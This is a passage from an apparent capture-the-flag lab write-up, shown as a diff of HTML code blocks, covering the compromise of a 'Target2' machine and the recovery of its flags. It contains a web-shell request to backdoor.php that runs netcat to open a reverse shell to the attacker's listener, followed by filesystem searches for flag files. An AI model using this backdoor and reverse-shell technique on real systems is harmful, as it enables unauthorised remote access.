+<span id="cb7-2"><a href="#cb7-2" aria-hidden="true"></a><span class="ex">listening</span> on [any] 4444 ...</span></code></pre></div>
+<div class="sourceCode" id="cb8"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true"></a><span class="ex">http</span>://192.168.1.115/backdoor.php?cmd=nc%20192.168.1.90%204444%20-e%20/bin/bash</span></code></pre></div>
+<div class="sourceCode" id="cb9"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true"></a><span class="ex">connect</span> to [192.168.1.90] from (UNKNOWN) [<span class="ex">192.168.1.115</span>] 45941</span></code></pre></div>
+<ul>
+<li>Target2 Flags</li>
+</ul>
+<div class="sourceCode" id="cb10"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true"></a><span class="fu">grep</span> -r <span class="st">&quot;flag1&quot;</span> / <span class="op">2&gt;</span>/dev/null</span>
+<span id="cb10-2"><a href="#cb10-2" aria-hidden="true"></a><span class="ex">/var/www/html/vendor</span>/PATH:<span class="ex">flag1</span><span class="dt">{a2c1f66d2b8051bd3a5874b5b6e43e21}</span></span></code></pre></div>
+<div class="sourceCode" id="cb11"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true"></a><span class="fu">find</span> / -iname *flag* <span class="op">2&gt;</span>/dev/null</span>
+<span id="cb11-2"><a href="#cb11-2" aria-hidden="true"></a></span>
+<span id="cb11-3"><a href="#cb11-3" aria-hidden="true"></a><span class="fu">cat</span> /var/www/flag2.txt</span>
+<span id="cb11-4"><a href="#cb11-4" aria-hidden="true"></a><span class="ex">flag2</span><span class="dt">{6a8ed560f0b5358ecf844108048eb337}</span></span></code></pre></div>
+<div class="sourceCode" id="cb12"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true"></a><span class="fu">find</span> /var/www/html/ -iname *flag*</span>
+<span id="cb12-2"><a href="#cb12-2" aria-hidden="true"></a><span class="ex">/var/www/html/wordpress/wp-content/uploads/2018/11/flag3.png</span></span>
+<span id="cb12-3"><a href="#cb12-3" aria-hidden="true"></a></span>
+<span id="cb12-4"><a href="#cb12-4" aria-hidden="true"></a><span class="ex">http</span>://192.168.1.115/wordpress/wp-content/uploads/2018/11/flag3.png</span></code></pre></div>
+<figure>
+<img src="images/target2_flag3.png" alt="" /><figcaption>flag3</figcaption>
+</figure>
